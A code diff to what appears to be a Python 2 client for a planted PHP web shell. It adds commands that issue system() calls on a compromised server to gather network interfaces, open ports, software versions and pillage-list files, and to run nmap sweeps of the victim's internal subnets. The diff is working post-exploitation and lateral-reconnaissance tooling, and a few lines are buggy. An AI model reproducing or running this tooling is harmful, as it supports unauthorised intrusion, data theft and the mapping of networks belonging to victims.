@@ -4,17 +4,62 @@ import httplib
 from urlparse import urlparse
 from cmd import Cmd
 import os
+import re
+
+
+def extract_ip_mask_ifconfig(addr_line):
+    ip = re.findall(r"inet addr:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", addr_line)
+    if ip and len(ip[0].split(":")) > 1:
+        ip = ip[0].split(":")[1]
+    mask = re.findall(r"Mask:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", addr_line)
+    bits = 0
+    if mask and len(mask[0].split(":")) > 1:
+        mask = mask[0].split(":")[1]
+        import math
+        octets = mask.split(".")
+        for o in octets:
+            mo = int(o)
+            if mo > 0:
+                bits += int(math.log(mo, 2)) + 1
+    return (ip, bits)
+
+
+def is_private_ip(ip):
+    octets = ip.split(".")
+    f = False
+    if len(octets) == 4:
+        o1 = int(octets[0])
+        o2 = int(octets[1])
+        if o1 == 10:
+            f = True
+        elif o1 == 172 and (o2 >= 16 and o2 <= 31):
+            f = True
+        elif o1 == 192 and o2 == 168:
+            f = True
+        elif o1 == 169 and o2 == 254:
+            f = True
+        else:
+            f = False
+    return f
 
 
 class rshell(Cmd):
 
     pwd = ""
     old_pwd = ""
+    ips = {}
+    hosts = {}
+    width = 80
 
     def __init__(self, shell_url, proxy):
         Cmd.__init__(self)
         self.shell_url = shell_url
         self.proxy = proxy
+
+    def log_data(cmd, data):
+        f = open(cmd.split()[0], "w")
+        f.write(data)
+        f.close()
 
     def do_help(self, line):
         print "help: Show this message"
@@ -22,7 +67,12 @@ class rshell(Cmd):
         print "download: download remotepath/remotefile localpath/localfile"
         print "upload: upload localpath/localfile remotepath/remotefile"
         print "compress_folder: compress_folder folder_path file.tar.gz"
-        print "do_dwfolder: do_dwfolder folder_path"
+        print "dwfolder: do_dwfolder folder_path"
+        print "getsysinfo: get info about the system"
+        print "getswversion: get versions of some software"
+        print "check_files: check existence of a list of files (pillage.lst)"
+        print "get_local_ips: get local ips and subnet mask bits"
+        print "print_local_ips: print local ips finded"
         print "Or write a command to send to the server shell"
         return None
 
@@ -169,11 +219,12 @@ class rshell(Cmd):
                 "Network iterfaces:": "ifconfig -a",
                 "/etc/resolv.conf:": "cat /etc/resolv.conf",
                 "Hosts ips information /etc/hosts:": "cat /etc/hosts",
+                "Open ports": "netstat -ant",
                 }
         for k, val in cmds.items():
-            print "=" * 80
+            print "=" * self.width
             print k
-            print "-" * 80
+            print "-" * self.width
             self.default(val)
         return None
 
@@ -185,10 +236,10 @@ class rshell(Cmd):
                 "ruby": "ruby -v Returns",
                 "python": "python --version",
                 }
-        print "=" * 80
+        print "=" * self.width
         print "Software versions:"
         for k, val in cmds.items():
-            print "-" * 80
+            print "-" * self.width
             self.default(val)
         return None
 
@@ -209,8 +260,56 @@ class rshell(Cmd):
         filelist.close()
         return None
 
-    def do_get_neighbors():
-        pass
+    def do_get_local_ips(self, line):
+        cmd = "system('ifconfig -a | grep addr:');"
+        (code, response) = self.dorequest(cmd)
+        if code == 200:
+            if response and response != "":
+                addr_list = response.split("\n")
+                for addr_line in addr_list:
+                    (ip, bits) = extract_ip_mask_ifconfig(addr_line)
+                    if ip and bits:
+                        self.ips[ip] = {"mask_bits": bits}
+                print self.ips
+        else:
+            print "Error"
+        return None
+
+    def do_print_local_ips(self, line):
+        for ip, info in self.ips.items():
+            print "=" * self.width
+            print "{0}:".format(ip)
+            print "mask bits: {0}".rjust(16).format(info["mask_bits"])
+        return None
+
+    def do_find_hosts(self, line):
+        cmd = "nmap "
+        if self.ips:
+            for ip, info in self.ips.items():
+                if not ip.startswith("127."):
+                    cmd += "{0}\{1} ".format(ip, info["mask_bits"])
+            (code, response) = self.dorequest("system('{0}');".format(cmd))
+            if code == 200:
+                scans = response.split("Nmap scan report for ")[1:]
+                for host in scans:
+                    hs = host.split("\n\n")[0]
+                    lhs = hs.split("\n")
+                    hostname = lhs[0].split()[0]
+                    ip = lhs[0].split()[1][1:-1]
+                    ports = lhs[4:]
+                    self.hosts[ip] = [hostname, ports]
+            else:
+                print "Error"
+        else:
+            print "You must run get_local_ips first"
+        self.do_print_hosts(None)
+        return None
+
+    def do_print_hosts(self, line):
+        if line:
+            print self.hosts[line.split()[0]]
+        else:
+            print self.hosts
 
 #    def do_cd(self, line):
 #        cmd = "cd ../; pwd"
